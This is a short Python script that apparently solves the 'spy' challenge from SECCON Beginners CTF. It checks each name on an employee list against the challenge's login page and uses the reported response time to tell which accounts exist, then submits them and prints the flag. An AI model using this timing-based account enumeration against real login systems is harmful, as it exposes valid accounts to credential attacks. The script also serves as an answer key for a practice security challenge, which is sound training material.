import requests
import pathlib


def _login(account):
    r = requests.post('https://spy.quals.beginners.seccon.jp/', data={'name': account, 'password': 'password'})
    body = r.content.decode()
    i = body.find('It took ') + 8
    t = float(body[i:].split()[0])
    if t > 0.1:
        return account
    return ''


def _answer(accounts):
    r = requests.post('https://spy.quals.beginners.seccon.jp/challenge', data={'answer': accounts})
    body = r.content.decode()
    tag = '<p id="message">'
    i = body.find('<p id="message">') + len(tag)
    j = body[i:].find('</p>')
    return body[i:i + j]


def _main():
    file_path = pathlib.Path(__file__).parent / 'employees.txt'
    accounts = []
    with open(file_path) as f:
        for line in f:
            account = line[:-1]
            account = _login(account)
            if account != '':
                accounts.append(account)

    flag = _answer(accounts)

    print(flag)


if __name__ == '__main__':
    _main()
